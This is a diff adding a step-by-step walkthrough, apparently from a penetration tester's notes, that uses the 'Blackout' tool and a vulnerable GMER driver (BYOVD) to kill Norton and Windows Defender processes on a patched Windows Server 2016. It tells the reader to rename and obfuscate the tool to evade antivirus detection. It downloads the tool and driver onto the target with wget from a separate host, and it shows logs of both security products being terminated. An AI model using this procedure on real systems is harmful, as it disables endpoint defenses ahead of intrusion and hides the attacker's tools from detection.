@@ -1,0 +1,191 @@
+================================================================================================================================
+Killing Antivirus/EDR protected processes using the tool 'Blackout' (BYOVD technique)
+================================================================================================================================
+
+Source: https://github.com/ZeroMemoryEx/Blackout
+
+=> The tool 'Blackout' allows to kill anti-malware (AV and EDR) protected processes using the GMER driver (BYOVD technique - "Bring Your Own Vulnerable Driver").
+=> It bypasses Hypervisor-protected Code Integrity (HCVI).
+=> The sample driver is sourced from the loldrivers website > https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/
+=> The tool is composed of an executable file (Blackout.exe) and a driver file (Blackout.sys).
+
+Important note:
+---------------
+The file "Blackout.exe" is flagged by AV solutions so you need to manually obfuscate the source code before compiling it (or use a packer).
+
+
+==========================================================================================================================================
+PoC - Killing the Norton AV processes & Windows Defender AV processes on a Windows server 2016 fully patched using the tool 'Blackout'
+==========================================================================================================================================
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download the source code from GitHub and then obfuscate it and compile it
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+Very basic obfuscation
+------------------------
+=> Rename the word "Blackout" by "Audit"
+=> Remove existing comments and add random new comments in the source code
+=> Rename the driver by 'Audit.sys'. 
+
+Visual Studio logs
+-------------------
+Rebuild started...
+1>------ Rebuild All started: Project: Audit, Configuration: Debug x64 ------
+1>audit.cpp
+1>Blackout.vcxproj -> C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Blackout-master\x64\Debug\Audit.exe
+========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
+========== Rebuild started at 11:15 PM and took 01.036 seconds ==========
+
+
+PS C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Blackout-master\x64\Debug> dir
+
+    Directory: C:\Users\j-cana\Documents\Tools-Pentest\1-Antivirus-bypass\Blackout-master\x64\Debug
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/11/2023  11:15 PM        1283584 Audit.exe
+-a----         7/11/2023  11:15 PM        7352320 Audit.pdb
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download the obfuscated version of the tool (renamed as 'Audit.exe') and the vulnerable driver (renamed as 'Audit.sys') in the same folder
+         on the target Windows 2016 server
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp > systeminfo
+
+Host Name:                 WEBSERVER2
+OS Name:                   Microsoft Windows Server 2016 Datacenter
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00377-90016-42795-AA673
+Original Install Date:     29/01/2023, 23:32:13
+System Boot Time:          11/07/2023, 22:20:42
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 140 Stepping 1 GenuineIntel ~2995 Mhz
+BIOS Version:              innotek GmbH VirtualBox, 01/12/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             fr;French (France)
+Input Locale:              fr;French (France)
+Time Zone:                 (UTC+01:00) Brussels, Copenhagen, Madrid, Paris
+Total Physical Memory:     8 192 MB
+Available Physical Memory: 5 999 MB
+Virtual Memory: Max Size:  11 520 MB
+Virtual Memory: Available: 9 296 MB
+Virtual Memory: In Use:    2 224 MB
+Page File Location(s):     C:\pagefile.sys
+<SNIP>
+
+PS C:\temp > wget -URI http://192.168.1.50:8000/Audit.exe -OutFile Audit.exe
+PS C:\temp > wget -URI http://192.168.1.50:8000/Audit.sys -OutFile Audit.sys
+
+
+Important notes regarding the AV solutions running on the target Windows server during my tests
+------------------------------------------------------------------------------------------------
+=> The Windows Defender AV is running, up-to-date and with the real-time protection enabled.
+   There are 2 processes for the Windows Defender AV which are named "MsMpEng" (PID "2028") and "NisSrv" (PID "3436").
+
+=> The Norton Security Antivirus solution is running, up-to-date and with the real-time protection enabled (however "heuristic check" is Off).
+   There are 2 processes for the Norton Security Antivirus which are named "NortonSecurity" with the PID "1912" and "3704".
+
+PS C:\temp> ps
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+     89      10    11988      13260       0,11   4388   1 cmd
+    175      12     5876      17304       0,27   4400   1 conhost
+    396      12     2044       4348       0,31    400   0 csrss
+    299      13     1848       4532       0,39    504   1 csrss
+    341      30    22880      48488       0,33    916   1 dwm
+   1684      87    31324      95420       3,23    648   1 explorer
+      0       0        0          4                 0   0 Idle
+    981      26     5960      15868       1,27    640   0 lsass
+    190      13     2828       9660       0,11   3116   0 msdtc
+    624      90   257156     210052     107,39   2028   0 MsMpEng
+    187      20     4096      10356       0,06   3436   0 NisSrv
+   3263      85   279328      27844     126,86   1912   0 NortonSecurity
+   1227      50    22688       9640       0,94   3704   1 NortonSecurity
+    215      15     3108      16784       0,06   3876   1 notepad
+<SNIP>
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Run the obfuscated version of the tool with local admin privileges and kill the protected processes of the the Norton AV and the Windows Defender AV
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> We run the tool with the command: "Audit.exe -p <pid_of_the_process_to_kill>
+
+PS C:\temp> .\Audit.exe -p 1912
+driver path: C:\temp\Audit.sys
+Loading Audit.sys driver ..
+Service created successfully.
+Starting service...
+driver loaded successfully !!
+driver initialized 9876C004 !!
+terminating process !!
+process has been terminated!
+
+Press any key to continue . . .
+
+PS C:\temp> ps
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+     89       9    10956      13244       0,11   4388   1 cmd
+    173      12     6380      17864       0,94   4400   1 conhost
+    376      12     1992       4324       0,33    400   0 csrss
+    324      13     1912       4984       1,27    504   1 csrss
+    339      30    23468      48644       0,48    916   1 dwm
+   1621      84    30192      94380       4,22    648   1 explorer
+      0       0        0          4                 0   0 Idle
+    961      26     6068      15956       1,42    640   0 lsass
+    190      13     2788       9648       0,11   3116   0 msdtc
+    627      90   254244     215488     113,42   2028   0 MsMpEng
+    185      19     3924      10304       0,06   3436   0 NisSrv
+    211      14     2912      16876       0,09   3876   1 notepad
+   1154      38    84308     111272       2,97   4600   1 powershell
+<SNIP>
+
+=> Result: the Norton AV processes named "NortonSecurity" (with the PID "1912" and "3704") have been killed !!
+
+
+PS C:\temp> .\Audit.exe -p 2028
+
+driver path: C:\temp\Audit.sys
+Loading Audit.sys driver ..
+Service already exists.
+driver loaded successfully !!
+driver initialized 9876C004 !!
+Terminating Windows Defender ..
+keep the program running to prevent the service from restarting it
+Defender Terminated ..
+
+=> Result: the Windows Defender AV process (MsMpEng) has been killed !!
+
+PS C:\temp> ps
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+     89       9    10956      13244       0,11   4388   1 cmd
+    173      12     6380      17864       0,94   4400   1 conhost
+    376      12     1992       4324       0,33    400   0 csrss
+    324      13     1912       4984       1,27    504   1 csrss
+    339      30    23468      48644       0,48    916   1 dwm
+   1621      84    30192      94380       4,22    648   1 explorer
+      0       0        0          4                 0   0 Idle
+    961      26     6068      15956       1,42    640   0 lsass
+    190      13     2788       9648       0,11   3116   0 msdtc
+    185      19     3924      10304       0,06   3436   0 NisSrv
+    211      14     2912      16876       0,09   3876   1 notepad
+   1154      38    84308     111272       2,97   4600   1 powershell
+<SNIP>
